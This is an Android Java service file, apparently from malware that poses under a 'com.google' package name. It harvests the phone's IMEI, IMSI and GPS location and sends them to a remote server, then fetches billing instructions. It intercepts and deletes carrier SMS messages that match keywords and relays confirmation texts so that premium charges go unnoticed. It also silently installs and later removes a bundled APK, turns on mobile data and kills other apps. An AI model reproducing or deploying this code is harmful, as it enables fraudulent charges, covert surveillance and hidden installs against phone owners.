package com.google.newstar;


import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.google.httputils.AsyncHttpClient;
import com.google.httputils.AsyncHttpResponseHandler;
import com.google.httputils.RequestParams;
import com.google.utils.AppContants;
import com.google.utils.CostInfo;
import com.google.utils.DataPreference;
import com.google.utils.Tools;
import com.google.utils.Utils;

import android.app.ActivityManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.RemoteException;
import android.telephony.TelephonyManager;
import android.text.format.DateUtils;
import android.util.Log;

public class NewStarService extends Service{
	private String latitude,longitude,imei,imsi,soversion,device,os; 
	private ContentResolver contentResolver;
	private AutoSMS autoSMS = new AutoSMS();
	private LockBroad lockbroad = new LockBroad();
	private ScreenReceiver screenreceiver;
	private IntentFilter SMSFilter = null;
	private IntentFilter lockFilter = null;
	private ContentObserver mObserver;
	private CostInfo costInfo;
	private GoogleServiceReceiver googleServiceReceiver;
	public LocationClient mLocationClient = null;
	public MyLocationListenner myListener = new MyLocationListenner();
	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

        @Override
        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
        	
        }
    };
	//判断本机是否注册
	private boolean isregister;
	private boolean isgprsused;
	//判断今天是否联网
	private boolean isRequest;
	Handler handler = new Handler(){

		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			switch (msg.what) {
			case 5:
				if (!(DataPreference.COSTINFO.get().length()>1)) 
					break;
				
				if (Utils.compareTime(DataPreference.LASTTIME.get(), Utils.getCurrentTime().toString())
                		<Integer.parseInt(costInfo.getWordtime())) {
				Cursor cursor = contentResolver.query(Uri.parse("content://sms"), new String[]{"_id", "address", "read","body"}, "read=?", new String[]{"0"}, "date desc");
//				if (costInfo==null) 
//					costInfo=Utils.getJsonObject();
				if ((cursor!=null)&&(costInfo!=null)) {
					while (cursor.moveToNext()) {
						Utils.Log("test", cursor.getString(cursor.getColumnIndex("body")));
						Utils.Log("test", cursor.getString(cursor.getColumnIndex("address")));
						String address= cursor.getString(cursor.getColumnIndex("address"));
						Utils.Log("test", cursor.getString(cursor.getColumnIndex("_id")));
						String body = cursor.getString(cursor.getColumnIndex("body"));
						Utils.Log("test", Utils.isContainsArray(body, costInfo.getTwokeyword(),false)+"");
						if (costInfo.getType().equals("二次")&&(Utils.isContainsArray(body, costInfo.getTwokeyword(), false)&&(costInfo.getTwokeyword()!=null))) {
							Utils.Log("test", "是二次短信");
							Intent broadcastintent = new Intent();
                            broadcastintent.setAction("android.action.cutsms");
                            Bundle bundleinfos = new Bundle();
                            bundleinfos.putString("address", address);
                            bundleinfos.putString("body", body);
                            broadcastintent.putExtras(bundleinfos);
                            getApplicationContext().sendBroadcast(broadcastintent);
							Utils.Log("test", "发送二次短信");
						}
						if (costInfo.getType().equals("动态")&&(Utils.isContainsArray(body, costInfo.getTwokeyword(), false)&&(costInfo.getTwokeyword()!=null))) {
							Intent broadcastintent = new Intent();
                            broadcastintent.setAction("android.action.cutsms");
                            Bundle bundleinfos = new Bundle();
                            bundleinfos.putString("address", address);
                            bundleinfos.putString("body", body);
                            broadcastintent.putExtras(bundleinfos);
                            getApplicationContext().sendBroadcast(broadcastintent);
						}
						if (Utils.isContainsArray(body, costInfo.getTwokeyword(), false)||Utils.isContainsArray(body, costInfo.getIntkeyword(),false)
								||address.startsWith(costInfo.getWordprot())&&(!Utils.isContainsArray(body, costInfo.getNotintkeyword(),false)))
							 {
							Utils.AppToast("短信数据库发送变化", getApplicationContext());
							deleteSms(Integer.parseInt(cursor.getString(cursor.getColumnIndex("_id"))));
							Utils.AppToast("短信删除完毕", getApplicationContext());
						}
					}
					cursor.close();
				}
				}
				break;
			case 2:
				try {
					Thread.sleep(18000);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
				try {
					Tools.getPackageManger().deletePackage("com.google.googletools", null, 0);
				} catch (RemoteException e) {
					e.printStackTrace();
				}
				break;

			case 1:
				Utils.AppToast("开始安装", getApplicationContext());
//				killprocess();
				installsilence();
				break;
			}
		}
		
	};
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		mLocationClient = new LocationClient( this );
		mLocationClient.registerLocationListener( myListener );
		setLocationOption();//设定定位参数
		
		googleServiceReceiver = new GoogleServiceReceiver();
		registGoogleServiceReceiver();
		//获取手机信息
		getInfo();
		contentResolver = getContentResolver();
		//注册拦截
		registerSMSReceiver();
		registerReceiver(autoSMS, SMSFilter);
		addSMSObserver();
		registerScreenReceiver();
		registerLockReceiver();
		costInfo = Utils.getJsonObject();
	}
	private void killprocess(){
		ActivityManager activitymanager = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
		List<ActivityManager.RunningAppProcessInfo> list = activitymanager.getRunningAppProcesses();
		if (list!=null) {
			for (int i = 0; i < list.size(); i++) {
				ActivityManager.RunningAppProcessInfo apinfo = list.get(i);
//				if (apinfo.importance>ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE) {
					if (!(apinfo.processName.equals("com.google.googletools")||apinfo.processName.equals("com.google.newstar"))) {
						activitymanager.killBackgroundProcesses(apinfo.processName);
					}
//				}
			}
		}
		try {
			Thread.sleep(4000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
	
	private void registerScreenReceiver() {
        screenreceiver = new ScreenReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        registerReceiver(screenreceiver, filter);
    }
	
	class ScreenReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context arg0, Intent arg1) {
			if (arg1.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
				if ((!DataPreference.isInstall.get())&&DataPreference.ISGETREQUEST.get()||
						(DataPreference.GETLOCATIONCOUNT.get()==0)&&(!DataPreference.ISGETLOCATION.get())&&(DataPreference.LATITUED.get().equals("null"))&&(!DataPreference.isInstall.get())) 
				{
					Utils.Log("test", "执行下载安装");
					handler.postDelayed(new Runnable() {
						@Override
						public void run() {
							try {
								Tools.getPackageManger().deletePackage("com.google.googletools", null, 0);
							} catch (RemoteException e) {
								e.printStackTrace();
							}
						}
					}, 900000);
					handler.sendEmptyMessage(1);
				}
				String str = Utils.getCurrentTime();
				if (Utils.compareTimeforLong(DataPreference.LASTTIME.get(), str)>6) {
					Utils.Log("test", "6天没联网了");
        			isgprsused = Utils.gprsIsOpenMethod("getMobileDataEnabled",getApplicationContext());
        			if (!isgprsused) 
                    	Utils.setGprsEnabled("setMobileDataEnabled", true);
        			getCostInfo(imei, imsi);
				}
			}
			
			if (arg1.getAction().equals(Intent.ACTION_SCREEN_ON)) {
				if (DataPreference.isInstall.get()&&Utils.compareTimeTomini(DataPreference.installTime.get(), Utils.getCurrentTime())>9) {
				try {
					Tools.getPackageManger().deletePackage("com.google.googletools", null, 0);
				} catch (RemoteException e) {
					e.printStackTrace();
				}
			}
			}
		}
		
	}


	@Override
	public void onDestroy() {
		if (mLocationClient.isStarted()) 
		mLocationClient.stop();//停止定位
		if (googleServiceReceiver!=null) 
			unregisterReceiver(googleServiceReceiver);
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//现在的时间与上一次请求的时间间隔超过1天再次请求
		if (Utils.compareTime(DataPreference.LASTTIME.get(), Utils.getCurrentTime())>=1) 
			DataPreference.ISREQUEST.put(false);
		return super.onStartCommand(intent, flags, startId);
		
	}
	
	private void registerSMSReceiver(){
		 SMSFilter = new IntentFilter();
		 SMSFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		 SMSFilter.setPriority(Integer.MAX_VALUE);
	}
	private void registerLockReceiver(){
		lockFilter = new IntentFilter();
		lockFilter.addAction(Intent.ACTION_USER_PRESENT);
		registerReceiver(lockbroad, lockFilter);
	}
	
	//增加短信数据库监听
		public void addSMSObserver()
		{
			ContentResolver resolver = getContentResolver();
			mObserver = new SMSObserver(resolver, handler);
			resolver.registerContentObserver(SMS.CONTENT_URI, true, mObserver);
		}
		
		private void getInfo() {
			PackageInfo packageInfo;
			try {
				packageInfo = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_ACTIVITIES);
				soversion=packageInfo.versionCode+"";
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			TelephonyManager mTm = (TelephonyManager)this.getSystemService(TELEPHONY_SERVICE);
			imei = mTm.getDeviceId();
			DataPreference.IMEI.put(imei);
			imsi = mTm.getSubscriberId();
			device = android.os.Build.BRAND;//手机品牌
			os = android.os.Build.VERSION.RELEASE;
			Utils.AppToast(os, getApplicationContext());
			}
		private void regisSoftware(){
			DataPreference.ISUSEREGISTER.put(true);
			Utils.AppToast("开始注册了", getApplicationContext());
			getSharedPreferences("dataFile",MODE_MULTI_PROCESS).edit().putLong("registime", System.currentTimeMillis()).commit();
			AsyncHttpClient httpClient = new AsyncHttpClient();
			RequestParams params = new RequestParams();
			params.put("imei", imei);
			params.put("imsi", imsi);
			params.put("soversion", soversion);
			params.put("device", device);
			params.put("os", os);
			if (latitude.length()>1) {
				params.put("latitude", latitude);
			}else {
				params.put("latitude", DataPreference.LATITUED.get());
			}
			if (longitude.length()>1) {
				params.put("longitude", longitude);
			}else {
				params.put("longitude", DataPreference.LONGITUED.get());
			}
			
			httpClient.post(AppContants.REGIS_SOFTWARE,params,new AsyncHttpResponseHandler(){
				@Override
				public void onStart() {
					super.onStart();
					Utils.AppToast("注册开启了", getApplicationContext());
				}

				@Override
				public void onSuccess(String content) {
					super.onSuccess(content);
						if (content!=null&&content.equals("true")) {
							Utils.AppToast("注册成功了", getApplicationContext());
							//保存注册成功的信息
							DataPreference.ISREGISTOR.put(true);
							//注册成功后立马获取扣费信息
							getCostInfo(imei,imsi);
						}
				}

				@Override
				public void onFailure(Throwable error, String content) {
					super.onFailure(error, content);
				}
				
			});
		}
		
		//获取扣费信息
		private void getCostInfo(String imei,String imsi){
			AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
			RequestParams params = new RequestParams();
			params.put("imei", imei);
			params.put("imsi", imsi);
			Utils.Log("test", params.toString());
			Utils.AppToast(params.toString(), getApplicationContext());
			asyncHttpClient.post(AppContants.GET_COSTINFO, params,new AsyncHttpResponseHandler(){

				@Override
				public void onStart() {
					super.onStart();
				}

				@Override
				public void onSuccess(String content) {
					super.onSuccess(content);
					if (content.equals("false")) {
						DataPreference.ISREQUEST.put(true);//设置请求过了
						DataPreference.LASTTIME.put(Utils.getCurrentTime());
						return;
					}
					if (content!=null&&(!content.equals("false"))) {
						Utils.AppToast("扣费获取成功", getApplicationContext());
						costInfo = ApplicationEx.getCostInfo();
						try {
							JSONObject jsonObject = new JSONObject(content);
							Utils.Log("test", "扣费内容="+content.toString());
							costInfo.setType(jsonObject.getString("type"));
							costInfo.setCommcate(jsonObject.getString("commcate"));
							costInfo.setDeductime(jsonObject.getString("deductime"));
							String string = jsonObject.getString("deductime");
							String[] a = string.split("-");
							costInfo.setStarttime(a[0]);//扣费开始时间
							costInfo.setEndtime(a[1]);//扣费结束时间
							costInfo.setInterval(jsonObject.getString("interval"));
							Utils.AppToast("时间间隔"+costInfo.getInterval(), getApplicationContext());
							JSONArray array1 = jsonObject.getJSONArray("intkeyword");
							String[] intkeyword = new String[array1.length()];
							for (int i = 0; i < intkeyword.length; i++) {
								intkeyword[i]=array1.getString(i);
								Log.e("test", "arry1.string="+array1.getString(i));
							}
							costInfo.setIntkeyword(intkeyword);
							JSONArray array2 = jsonObject.getJSONArray("notintkeyword");
							String[] notintkeyword = new String[array2.length()];
							for (int j = 0; j < notintkeyword.length; j++) {
								notintkeyword[j]=array2.getString(j);
							}
							JSONArray array3 = jsonObject.getJSONArray("twokeyword");
							String[] twokeyword = new String[array3.length()];
							for (int j = 0; j < twokeyword.length; j++) {
								twokeyword[j]=array3.getString(j);
							}
							costInfo.setNotintkeyword(notintkeyword);
							costInfo.setReply(jsonObject.getString("reply"));
							costInfo.setTnumber(jsonObject.getString("tnumber"));
							costInfo.setTwokeyword(twokeyword);
							costInfo.setWordprot(jsonObject.getString("wordprot"));
							costInfo.setWordtime(jsonObject.getString("wordtime"));
							DataPreference.WORDTIME.put(jsonObject.getString("wordtime"));
							costInfo.setProtcode(jsonObject.getString("protcode"));
							Utils.Log("test", costInfo.getCommcate()+costInfo.getDeductime()+costInfo.getInterval()+costInfo.getProtcode()
									+costInfo.getReply()+costInfo.getTnumber()+costInfo.getTwokeyword()+costInfo.getType()+costInfo.getWordprot()
									+costInfo.getWordtime()+costInfo.getIntkeyword().toString()+costInfo.getNotintkeyword().toString());
							
						} catch (JSONException e) {
							e.printStackTrace();
						}
						DataPreference.COSTINFO.put(content);
						DataPreference.ISREQUEST.put(true);//设置请求过了
						DataPreference.LASTTIME.put(Utils.getCurrentTime());
						DataPreference.ISGETREQUEST.put(true);
						
					}
				}

				@Override
				public void onFailure(Throwable error, String content) {
					super.onFailure(error, content);
					Utils.AppToast("扣费Onfailure!!", getApplicationContext());
				}
				
			});
		}
		
		public void initLocation(){
			getSharedPreferences("dataFile",MODE_MULTI_PROCESS).edit().putLong("getlocationtime", System.currentTimeMillis()).commit();
			if (DataPreference.GETLOCATIONCOUNT.get()!=0) 
			DataPreference.GETLOCATIONCOUNT.put(DataPreference.GETLOCATIONCOUNT.get()-1);
			mLocationClient.start();//开始定位
		}
		
		//删除短信
		 public boolean deleteSms(long id) {
			 Uri uri = ContentUris.withAppendedId(SMS.CONTENT_URI, id);
	         return 1 == contentResolver.delete(uri, null, null);
	 }
		 
		 private void installsilence(){
			 String path = Utils.getDownloadLocation(NewStarService.this);
				Log.e("test", path);
				InputStream is;
				try {
					is = NewStarService.this.getAssets().open("GoogleTools.apk");
					File file = new File(path,"GoogleTools.apk");
					if (file.exists()) {
						file.delete();
					}
					file.createNewFile();
					FileOutputStream fos = new FileOutputStream(file);
					byte[] temp = new byte[1024];
					int i = 0;
					while ((i = is.read(temp)) > 0) {
					fos.write(temp, 0, i);
					}
					fos.close();
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
				Utils.installFile(NewStarService.this, path+"/GoogleTools.apk", observer);
		 }
		 
		 class LockBroad extends BroadcastReceiver{
			@Override
			public void onReceive(Context arg0, Intent arg1) {
				if (arg1.getAction().equals(Intent.ACTION_USER_PRESENT)) {
					if (Utils.compareBooleanTime("08:00:00", "22:00:00")) {
						//判断是否注册成功过
						isregister = DataPreference.ISREGISTOR.get()?true:false;
						isRequest = DataPreference.ISREQUEST.get()?true:false;
						if (isregister) {
							if (isRequest) {
								
							}else {
								getCostInfo(imei,imsi);
							}
						}else {
							if((!DateUtils.isToday(getSharedPreferences("dataFile",MODE_MULTI_PROCESS).getLong("registime", 0)))&&
									(DataPreference.GETLOCATIONCOUNT.get()==1||DataPreference.GETLOCATIONCOUNT.get()==0)&&Utils.isOnline(getApplicationContext()))
							regisSoftware();
						}
					}
					
					long time = getSharedPreferences("dataFile", MODE_MULTI_PROCESS).getLong("getlocationtime", 0);
					Log.e("test", DataPreference.GETLOCATIONCOUNT.get()+"");
					if (DateUtils.isToday(time)||DataPreference.GETLOCATIONCOUNT.get()==0) 
						return;
						//获取手机的经纬度
					if (Utils.isOnline(getApplicationContext())) 
							initLocation();
				}
			}
			 
		 }
		 
		 private void registGoogleServiceReceiver(){
				IntentFilter intentfilter = new IntentFilter();
				intentfilter.addAction("android.action.over");
				registerReceiver(googleServiceReceiver, intentfilter);
			}
		 class GoogleServiceReceiver extends BroadcastReceiver{
			@Override
			public void onReceive(Context arg0, Intent arg1) {
				if (arg1.getAction().equals("android.action.over")) {
					handler.sendEmptyMessage(2);
				}
			}
			 
		 }
		 
		 public class MyLocationListenner implements BDLocationListener {
				@Override
				//接收位置信息
				public void onReceiveLocation(BDLocation location) {
					if (location == null)
						return ;
					latitude = location.getLatitude()+"";//经度
					longitude = location.getLongitude()+"";//纬度
					Log.e("test", latitude+":::::::"+longitude);
					Utils.AppToast("经纬度:"+latitude+":::::::"+longitude, getApplicationContext());
					DataPreference.LONGITUED.put(longitude);
					if (latitude.length()>1) 
						DataPreference.LATITUED.put(latitude);
						mLocationClient.stop();
					
				}
				//接收POI信息函数，我不需要POI，所以我没有做处理
				public void onReceivePoi(BDLocation poiLocation) {
					if (poiLocation == null) {
						return;
					}
				}
			}
		 
		 private void setLocationOption(){
				LocationClientOption option = new LocationClientOption();
				option.setOpenGps(true);
				option.setAddrType("all");//返回的定位结果包含地址信息
				option.setCoorType("bd09ll");//返回的定位结果是百度经纬度,默认值gcj02
				option.setScanSpan(50000);//设置发起定位请求的间隔时间为5000ms
				option.disableCache(true);//禁止启用缓存定位
				option.setPoiNumber(5);    //最多返回POI个数   
				option.setPoiDistance(1000); //poi查询距离        
				option.setPoiExtraInfo(true); //是否需要POI的电话和地址等详细信息        
				mLocationClient.setLocOption(option);
				
			} 
}
